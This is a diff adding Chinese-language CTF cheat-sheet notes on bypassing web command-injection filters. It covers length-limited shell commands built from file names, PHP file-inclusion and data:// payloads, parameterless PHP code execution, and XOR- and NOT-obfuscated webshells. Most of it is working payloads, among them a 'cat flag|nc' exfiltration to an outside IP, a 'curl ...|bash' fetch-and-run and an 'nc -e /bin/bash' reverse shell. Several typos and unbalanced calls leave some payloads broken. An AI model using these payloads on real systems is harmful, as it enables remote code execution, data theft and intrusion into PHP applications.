@@ -232,3 +232,428 @@ l
 
 fi表示结束
 
+# 8.长度限制绕过
+
+## 基础知识：
+
+**\>符号和\>>符号**
+
+\>表示直接替换
+
+\>>表示追加
+
+**ls -t **
+
+按时间顺序排列
+
+**sh命令** 从文件中读取目录
+
+**dir * 和rev命令** 
+
+$(dir *)如果第一个文件名是命令的话，会当做命令来执行
+
+rev 可以反转文件中的每一行的内容
+
+## 长度为7的绕过
+
+希望执行 cat flag|nc 123.60.57.4 7777
+
+**步骤一**：创建文件
+
+```
+?cmd=>7777
+?cmd=>\ \\
+?cmd=>4\\
+?cmd=>57.\\
+?cmd=>60.\\
+?cmd=>123.\\
+?cmd=>c\ \\
+?cmd=>\|n\\
+?cmd=>flag\
+?cmd=>t\ \\
+?cmd=>ca\\
+```
+
+**步骤二：**将文件名按顺序写入到文件
+
+```
+?cmd=ls -t>a
+```
+
+**步骤三：**将文件内容进行解析
+
+```
+?cmd=sh a
+?cmd=. a
+```
+
+## 长度为5的绕过
+
+**步骤一：**构造ls -t>y 超过5个字符
+
+先创建文件ls\
+
+再创建文件_,将ls\写入到\_文件中
+
+```
+#ls>_
+#>\ \\
+#-t\\
+#>\>y
+#ls>>_
+```
+
+若执行sh_则会执行 ls -t>y
+
+**步骤二：**分解命令，创造文件
+
+```
+#>bash
+#>\|\\
+#>61\\
+#>1\\
+#>1.\\
+#>68\\
+#>2.\\
+#>19\\
+#>\ \\
+#>rl\\
+#>cu\\
+```
+
+192.168.1.161下创建index.html
+
+```
+nc 192.168.1.161 7777 -e /bin/bash
+```
+
+**步骤三：**执行脚本sh
+
+先执行sh _相当于执行ls -t>y
+
+在执行sh y相当于执行y文件中的内容:curl 192.168.1.161|bash
+
+## 长度为4的绕过
+
+**步骤一：**构建ls -t>g
+
+会用到dir* rev所以构造应该是反序
+
+```
+#>g\>
+#>ht-          //h是按照时间排序
+#>sl
+#>dir
+```
+
+![image-20240522161439039](images/image-20240522161540137.png)
+
+```
+#>g;
+#>g\>
+#>ht-
+#>sl
+#>dir
+#*>v
+#>rev
+#*v>x
+```
+
+**步骤二：**构造反弹shell
+
+```
+curl 192.168.1.161|bash --->(进行16进制) curl 0xC0A801A1|bash
+```
+
+```
+#>ash
+#>b\
+#>\|\
+#>A1\
+#>01\
+#>A8\
+#>C0\
+#>0x\
+#>\ \
+#>rl\
+#>cu\
+#sh x
+#sh g
+```
+
+**步骤三：**反弹回来的shell查看flag
+
+192.168.1.161下创建index.html,内容如下：
+
+```
+nc 192.168.1.161 7777 -e /bin/bash
+```
+
+
+
+# 9.括号过滤绕过
+
+php中有许多不用括号的函数
+
+```
+<?php
+echo 123;
+print 123;
+die;
+include "/etc/passwd";
+require "/etc/passwd";
+include_once "/etc/passwd";
+require_once "etc/passwd";
+?>
+```
+
+payload:
+
+```
+?cmd=include"$_GET[url]"?>&url=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+不加分号也可以
+
+```
+?cmd=include$_GET[url]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+# 10.文件包含
+
+ include($c.".php");  //限制了.php后缀
+
+data://与文件包含函数结合时，用户输入的data://流会被当做php文件执行
+
+```
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag/i", $c)){
+        include($c);
+        echo $flag;
+    
+    }
+        
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+payload:
+
+```
+?c=data://text/palin,<?php echo system('cat flag');?>
+```
+
+对php过滤时：
+
+```
+?c=data://text:text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
+```
+
+# 11.无参数命令执行
+
+## 请求头绕过(php7.3)
+
+getallheaders()获取所有头部信息，功能与上个相似apache_request_headers()
+
+pos()获取第一个
+
+end()获取最后一个
+
+获取到之后进行执行即可
+
+eval(pos(getallheaders()))
+
+## 全局变量RCE(php5/7)
+
+get_defined_vars()用于返回已经定义的变量方法
+
+get>post>cookie>file>server
+
+可以定义多个get方法，返回get方法的第二个参数然后执行
+
+payload
+
+```
+?code=eval(end(pos(get_defined_vars())));&cmd=system('ls');
+```
+
+## 利用session（php5）
+
+print_r(session_id(session_start()))打印phpsession的值
+
+**方法一：**
+
+```
+show_source(session_id(session_start()));
+
+修改phpsession=./flag
+```
+
+**方法二：**
+
+```
+eval(bin2hex(session_id(session_start())))
+phpsession:将命令改为16进制编码
+```
+
+## scandir读取
+
+scandir()--列出指定路径下的所有文件
+getcwd()--返回当前工作目录
+current()--返回数组的第一个元素
+array_reversre()--将数组的最后一个变为第一个，第一个变为最后一个，其他以此类推
+array_flip()--交换数组的键和值
+next()--返回数组的第二个元素
+array_rand()--随机返回一个键值
+
+<font color=red>**chdir()--将执行指令的权限转移到当前目录**
+**例：当前目录是wwwroot目录**
+**dirname(getcwd())是上级目录，但是页面任然在wwwroot页面，要读取上级目录下的文件就需要chdir，chdir(dirname(getcwd()))**
+**用于读取任意目录下的文件**</font>
+strtev()--字符串反转
+crypt()--加密
+hebrevc()
+
+**当前目录**：
+
+```
+?code=print_r(localeconv()); //查看当前目录文件名
+?code=print_r(current(localeconv())); //返回第一个，内容是‘.’
+?code=print_r(scandir(current(localeconv()))); //查看当前目录下的文件
+如果是在最前面就使用pos读取，或者current
+如果是最后一个使用end读取，或者array_reverse()反转之后使用current读取
+然后使用show_source()读取
+```
+
+```
+?code=print_r(getcwd()); //查看当前路径
+?code=print_r(scandir(getcwd())); //查看当前路径下的文件
+然后读取操作如上
+```
+
+```
+?code=print_r(getcwd(); //查看当前路径
+?code=print_r(dirname(getcwd())); //查看当前路径的上一级路径
+?code=print_r(dirname(chdir(dirname(getcwd()))); //将操作权限切换到上级目录
+?code=print_r(scandir(dirname(chdir(dirname(getcwd())))); //读取上级目录下的文件
+因为flag可能不是第一个或者最后一个，不能使用ord和pos，可以使用array_flip()交换数组的键和值，再使用array_rand()随机返回一个键值，再用show_source()读取
+?code=print_r(array_rand(array_flid(scandir(dirname(chdir(dirname(getcwd())))))));
+```
+
+**根目录：**
+
+```
+?code=print_r(crypt(serialize(array()); //对这段字符串进行加密，最后一个字符可能会出现'/'
+然后反转
+?code=print_r(strrev(crypt(serialize(array()))));
+```
+
+<font color=red>ord()将第一个字符转为ascii码</font>
+
+<font color=red>chr()转换为字符串</font>
+
+```
+?code=print_r(chr(ord(strrev(crypt(serialize(array()))))); //有概率得到字符‘/’
+?code=print_r(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array())))))))));
+```
+
+# 12.无字母数字绕过
+
+## 异或绕过
+
+使用异或的方式，构造出想要使用的字符串的异或后的字符串
+
+使用脚本
+
+### php5
+
+```
+<?php
+$a='assert';
+$b='_POST';
+$c=$$b;
+$a($c['_'])
+```
+
+更改成异或的方式
+
+```
+<?php
+$_ = "!((%)("^"@[[@[\\";
+$__ = "!+/(("^"~{`{|";
+$___ = $$__;
+$_($__['_']);
+?>
+```
+
+```
+?cmd=$_ = "!((%)("^"@[[@[\\";$__ = "!+/(("^"~{`{|";$___ = $$__;$_($__['_']);
+
+需要进行url编码
+```
+
+```
+POST提交:_=system('ls')
+```
+
+
+
+### php7
+
+```
+<?php
+$_ = "!+/(("^"~{`{|";
+$__ = $$_;
+`$__['_']`;
+?>
+```
+
+```
+?cmd=$_ = "!+/(("^"~{`{|";$__ = $$_;`($__['_'])`;
+
+需要进行url编码
+```
+
+```
+POST提交:_=system('ls')
+```
+
+## 取反绕过
+
+### php5
+
+```
+<?php
+$_=~("%9e%8c%8c%9a%8d%8b");
+$__=~("%a0%af%b0%ac%ab");
+$___=$$_;
+$_($___[_]);
+```
+
+```
+?cmd=$_=~("%9e%8c%8c%9a%8d%8b");$__=~("%a0%af%b0%ac%ab");$__=$$_;$_($__[_]);
+
+需要进行url编码
+```
+
+POST提交:_=system('ls')
+
+### php7
+
+```
+<?php
+$__=~("%a0%af%b0%ac%ab");
+$___=$$__;
+`$___[_]`;
+```
+
+```
+?cmd=$__=~("%a0%af%b0%ac%ab");$___=$$__;`$___[_]`;
+
+需要进行url编码
+```
+
+POST提交:_=system('ls')
